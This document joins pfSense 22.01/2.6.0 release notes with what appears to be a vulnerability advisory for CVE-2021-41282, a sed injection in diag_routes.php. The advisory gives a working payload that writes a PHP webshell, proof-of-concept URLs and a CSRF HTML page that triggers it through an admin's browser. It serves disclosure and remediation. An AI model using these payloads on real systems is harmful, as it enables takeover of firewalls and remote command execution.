# 22.01/2.6.0 New Features and Changes[Â¶](#new-features-and-changes "Link to this heading")

This is a regularly scheduled release of pfSenseÂ® CE and pfSense Plus software
including new features, additional hardware support, and bug fixes.

Warning

When upgrading to pfSense Plus 22.01 and later versions, the
`pfSense-upgrade` process will forcefully reinstall all operating system
packages and add-on packages to ensure a consistent state and package set.
This may increase the time the upgrade will take to download and install.

## Security[Â¶](#security "Link to this heading")

This release includes corrections for the following vulnerabilities in pfSense
software:

* [pfSense-SA-22\_01.webgui](https://www.netgate.com/assets/downloads/advisories/pfSense-SA-22_01.webgui.asc)
  (File overwrite in `services_ntpd_gps.php`, [#12191](https://redmine.pfsense.org/issues/12191))
* [pfSense-SA-22\_02.webgui](https://www.netgate.com/assets/downloads/advisories/pfSense-SA-22_02.webgui.asc)
  (Potential vulnerabilities with route collection on `diag_routes.php` , [#12257](https://redmine.pfsense.org/issues/12257))
* [pfSense-SA-22\_03.webgui](https://www.netgate.com/assets/downloads/advisories/pfSense-SA-22_03.webgui.asc)
  (Potential vulnerabilities in OpenVPN form validation, [#12677](https://redmine.pfsense.org/issues/12677))
* [pfSense-SA-22\_04.webgui](https://www.netgate.com/assets/downloads/advisories/pfSense-SA-22_04.webgui.asc)
  (XSS in `pkg.php`, [#12725](https://redmine.pfsense.org/issues/12725))

## Errata[Â¶](#errata "Link to this heading")

* There is a patch available to improve NAT behavior for UPnP and multiple game
  consoles or clients playing the same game but the fix was discovered too late
  for it to be included in 22.01/2.6.0.

  For additional details and instructions on how to apply the patch, see
  [Redmine issue #7727](https://redmine.pfsense.org/issues/7727#note-74)
  note #74 and #75, the [Github commit](https://github.com/pfsense/pfsense/commit/3b50f7656967fbb4daa869a7ae6d18bc5ab6eec3),
  and [the forum thread for testing feedback](https://forum.netgate.com/post/1025339).

## General[Â¶](#general "Link to this heading")

* This release contains several significant changes to IPsec for stability and
  performance. Read the IPsec section of this document carefully.

  Warning

  IPsec VTI interface names have changed in this release. Configurations will
  be updated automatically where possible to use the new names.

  Check the interface names of assigned VTI instances under **Interfaces >
  Assignments** to ensure they are correct after the upgrade completes.

  If any third party software configurations or other manual changes
  referenced the old IPsec VTI interface names directly (e.g. `ipsecNNNN`)
  they must be updated to the new format.
* ZFS is now the default filesystem for new installations of pfSense Plus and
  pfSense CE software on all platforms which support booting from ZFS.

  + It is not possible to change from UFS to ZFS in place, a reinstallation of
    pfSense Plus or CE is required to migrate from UFS use ZFS.
  + The ZFS pool name and datasets have also been updated and optimized. Users
    who were already using ZFS may want to reinstall as well to ensure they have
    the most optimal disk layout.
  + pfSense Plus software has a new ZFS dashboard widget to track the status of
    disks using ZFS.
* **Log Compression** for rotation of System Logs is now disabled by default for
  new ZFS installations as ZFS performs its own compression.

  Tip

  The best practice is to disable **Log Compression** for rotation of System
  Logs manually for not only existing ZFS installations, but also for any
  system with slower CPUs. This setting can be changed under **Status >
  System Logs** on the **Settings** tab.
* The default password hash format in the User Manager has been changed from
  bcrypt to SHA-512. New users created in the User Manager will have their
  password stored as a SHA-512 hash. Existing user passwords will be changed to
  SHA-512 next time their password is changed.

  Note

  User Manager passwords are only stored as a hash, thus existing users
  cannot be automatically changed to the new format. To convert a user
  password from an older hash format, change the password for the user in the
  User Manager.
* The firewall now [bootstraps its clock](../services/ntpd/bootstrap.html#ntp-bootstrap) at boot in
  multiple ways, one of which utilizes multiple NTP servers with static IP
  addresses from [Google Public NTP](https://developers.google.com/time).
  This avoids a chicken-and-egg problem where the firewall cannot resolve NTP
  servers because DNSSEC, which is enabled by default, cannot function when the
  clock is inaccurate. The firewall performs this sync once per boot before it
  starts the NTP daemon.

  Note

  This behavior can easily be changed or disabled. See
  [Changing Clock Bootstrap Behavior](../services/ntpd/bootstrap.html#ntp-bootstrap-change).
* Several areas of the documentation have been rewritten and updated for these
  releases. Notably, the IPsec and OpenVPN sections have been updated
  significantly including all of the related configuration recipes.

# Remote Code Execution in pfSense <= 2.5.2

## Summary

pfSense allows authenticated users to get information about the routes set in the firewall. The information are retrieved by executing the `netstat` utility and then its output is parsed via the `sed` utility.
While the common prevention patterns for command injections (i.e. the usage of the `escapeshellarg` function for the arguments) are in use, it is still possible to inject `sed`-specific code and write an arbitrary file in an arbitrary location.
This vulnerability could be also exploited pre-authentication as the vulnerable endpoint is also vulnerable to a Cross-Site Request Forgery (CSRF).

## Product Description (from vendor)

pfSenseÂ® Plus software is the worldâs most trusted firewall. The software has garnered the respect and adoration of users worldwide - installed well over three million times. Made possible by open source technology. Made into a robust, reliable, dependable product by Netgate.

## CVE(s)

* [CVE-2021-41282](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41282)

## Details

### Root Cause Analysis

pfSense while trying to show the routes set in the firewall executes the `sed` utility with some user-controllable input.
`sed` - a stream editor - is a powerful utility to perform text transformations and has quite a lot of commands which could be defined as a single command line argument semicolon-separated. The ability of adding multiple commands in one argument is the key for this vulnerability.

What is important to specify before diving into the exploitation details is that pfSense is based on FreeBSD, so all the GNU-specific arguments of `sed` (e.g. the `e`/`exec` argument which could be used to run a system command) are not available.

An excerpt of the [vulnerable code](https://github.com/pfsense/pfsense/blob/a7086b04cae21ca742fdeefd1019ee1401b6dded/src/usr/local/www/diag_routes.php#L35-L65) follows:

| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  ``` | ``` 35  if (isset($_REQUEST['isAjax'])) { 36  	require_once('auth_check.inc'); 37   38  	$netstat = "/usr/bin/netstat -rW"; 39  	if (isset($_REQUEST['IPv6'])) { 40  		$netstat .= " -f inet6"; 41  		echo "IPv6\n"; 42  	} else { 43  		$netstat .= " -f inet"; 44  		echo "IPv4\n"; 45   46  	} 47  	if (!isset($_REQUEST['resolve'])) { 48  		$netstat .= " -n"; 49  	} 50   51  	if (!empty($_REQUEST['filter'])) { 52  		$netstat .= " | /usr/bin/sed -e " . escapeshellarg("1,3d; 5,\$ { /" . htmlspecialchars($_REQUEST['filter']) . "/!d; };"); 53  	} else { 54  		$netstat .= " | /usr/bin/sed -e '1,3d'"; 55  	} 56   57  	if (is_numeric($_REQUEST['limit']) && $_REQUEST['limit'] > 0) { 58  		$_REQUEST['limit']++;  // Account for the header line 59  		$netstat .= " | /usr/bin/head -n {$_REQUEST['limit']}"; 60  	} 61   62  	echo htmlspecialchars_decode(shell_exec($netstat)); 63   64  	exit; 65  }  ``` |
| --- | --- |

At line 51-52 it could be seen that if the request contains a `filter` parameter then its HTML special characters are converted to their HTML entities. Then the input is prefixed and suffixed by some hard-coded `sed` syntax, and finally everything is escaped by the [`escapeshellarg`](https://www.php.net/manual/en/function.escapeshellarg.php) function, which prevents sub-commands or other arguments from being injected. At line 62 the command is finally executed.

As mentioned before it is possible to inject arbitrary `sed` syntax, having the only limitation that the input is encoded via the [`htmlspecialchars`](https://www.php.net/manual/en/function.htmlspecialchars.php) function.
This allows to use the `s/match/replace/` command to replace part of the `netstat` output with an arbitrary string and the `w /path/to/file` command to write the output of the `sed` command to an arbitrary location.

Wrapping everything together an attacker could set in the filter parameter the following string:
`.*/!d;};s/Destination/\x3c\x3fphp+system($_GET[\x22a\x22])\x3b\x3f\x3e/;w+/usr/local/www/a.php%0a%23`
Which will result in the following command to be run:

```
/usr/bin/netstat -rW -f inet | /usr/bin/sed -e '1,3d; 5,\$ { /!d;};s/Destination/\x3c\x3fphp system($_GET[\x22a\x22])\x3b\x3f\x3e/;w /usr/local/www/a.php
#/!d; };'

```

As the `netstat` utility always outputs the `Destination` string, it was chosen to be replaced with `<?php system($_GET["a"]);?>` and then the output is written to `/usr/local/www/a.php`.

### Proof of Concept

1. Login to pfSense
2. Visit the following URL by replacing `<target>` with the IP address / domain of the target pfSense instance: `http://<target>/diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\x3c\x3fphp+system($_GET[\x22a\x22])\x3b\x3f\x3e/;w+/usr/local/www/a.php%0a%23`
3. Visit the following URL by replacing `<target>` with the IP address / domain of the target pfSense instance and notice that the `id` command has been executed: `http://<target>/a.php?a=id`

### Impact

An authenticated attacker could write an arbitrary file to the pfSense disk. This can be abused to write a webshell to execute arbitrary code / commands.

It should be noted that due to a lack of Cross-Site Request Forgery (CSRF) protections for the vulnerable endpoint it is possible for an attacker to trick an authenticated admin into visiting a malicious website to exploit the vulnerability through the victim’s session/browser. More details are available in the Cross-Site Request Forgery advisory.

A proof of concept to exploit the vulnerability through the CSRF follows:

1. Login to pfSense
2. Create an HTML file with the following content by replacing `<target>` with the IP address / domain of the target pfSense instance:

| ``` 1 2 3 4  ``` | ``` <meta name="referrer" content="no-referrer"> <script> window.location = "http://<target>/diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\\x3cscript\\x3eif\\x28location.pathname\\x21\\x3d\\x27\\x2fa.php\\x27\\x29\\x7blocation\\x3d\\x27\\x2fa.php\\x3fa\\x3did\\x27\\x7d\\x3c\\x2fscript\\x3e\\x3c\\x3fphp+system($_GET[\\x22a\\x22])\\x3b\\x3f\\x3e/;w+/usr/local/www/a.php%0a%23" </script>  ``` |
| --- | --- |

3. Visit the following URL by replacing `<target>` with the IP address / domain of the target pfSense instance and notice the 404 error: `http://<target>/a.php?a=id`
4. Host the HTML page created at step 2 on a webserver and visit it in the same browser used for the other steps
5. Notice that the Arbitrary File Write has been exploited to create a webshell in `/usr/local/www/a.php` and the victim is redirected to the webshell (`http://<target>/a.php?a=id`) to execute the `id` command

### Remediation

Upgrade pfSense CE to version 2.6.0 or pfSense Plus to version 22.01.
